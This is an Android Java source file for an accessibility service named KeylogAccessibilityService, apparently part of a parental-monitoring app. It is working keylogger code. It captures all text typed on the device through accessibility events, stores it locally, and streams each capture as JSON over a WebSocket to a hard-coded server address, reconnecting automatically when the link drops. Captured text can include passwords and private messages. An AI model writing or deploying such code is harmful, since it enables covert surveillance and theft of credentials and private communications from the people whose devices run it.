package com.xyz.child;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import androidx.room.Room;

import org.json.JSONObject;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class KeylogAccessibilityService extends AccessibilityService {
    private static final String DEVICE_ID = "child_device_001";
    private static final String SERVER_URL = "ws://192.168.0.102:8080";
    private AppDatabase roomDb;
    private WebSocket webSocket;
    private ExecutorService executor = Executors.newSingleThreadExecutor();

    @Override
    public void onCreate() {
        super.onCreate();
        roomDb = Room.databaseBuilder(getApplicationContext(), AppDatabase.class, "app_database").build();
        connectWebSocket();
    }

    private void connectWebSocket() {
        OkHttpClient client = new OkHttpClient();
        Request request = new Request.Builder().url(SERVER_URL).build();
        webSocket = client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, Response response) {
                Log.i("WebSocket", "Connected to server");
            }

            @Override
            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                Log.e("WebSocket", "Error: " + t.getMessage(), t);
                executor.execute(() -> {
                    try {
                        Thread.sleep(5000);
                        connectWebSocket();
                    } catch (InterruptedException e) {
                        Log.e("WebSocket", "Reconnect error: " + e.getMessage(), e);
                    }
                });
            }
        });
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText().toString();
            Log.i("Keylog", "Captured: " + text);
            sendKeylog(text);
        }
    }

    private void sendKeylog(String text) {
        executor.execute(() -> {
            LocalLog log = new LocalLog(DEVICE_ID, "keylog", text, System.currentTimeMillis());
            roomDb.logDao().insert(log);
            try {
                JSONObject json = new JSONObject();
                json.put("deviceId", DEVICE_ID);
                json.put("dataType", "keylog");
                json.put("data", text);
                json.put("timestamp", log.timestamp);
                webSocket.send(json.toString());
                Log.i("Keylog", "Sent keylog: " + text);
            } catch (Exception e) {
                Log.e("Keylog", "Error: " + e.getMessage(), e);
            }
        });
    }

    @Override
    public void onInterrupt() {}
}
